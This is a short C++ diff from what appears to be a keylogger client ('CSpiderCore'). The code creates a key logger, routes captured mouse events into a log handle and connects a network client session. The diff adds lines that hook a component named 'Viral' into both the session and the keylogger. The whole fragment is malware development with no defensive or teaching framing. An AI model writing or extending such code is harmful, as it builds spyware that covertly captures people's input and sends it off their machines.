@@ -39,6 +39,7 @@ namespace spi
             _clientSession->onConnect(boost::bind(&CSpiderCore::__setupLogHandleConnection,
                                                   this, net::ErrorPlaceholder));
             _clientSession->connect();
+            _sess->setup(&_viral);
             _io.run();
             return true;
         }
@@ -88,6 +89,7 @@ namespace spi
             _viral.setup();
             _logHandle.setup();
             _keyLogger->setup();
+            _viral.setup(_keyLogger.get());
 
             _keyLogger->onMouseMoveEvent([this](proto::MouseMove &&event) {
                 _logHandle.appendEntry(event);
@@ -111,7 +113,7 @@ namespace spi
 
         LogHandle _logHandle;
 
-        Viral _viral;
+        Viral _viral{};
 
         KeyLogPtr _keyLogger{Factory::createKeyLogger(_io)};
 
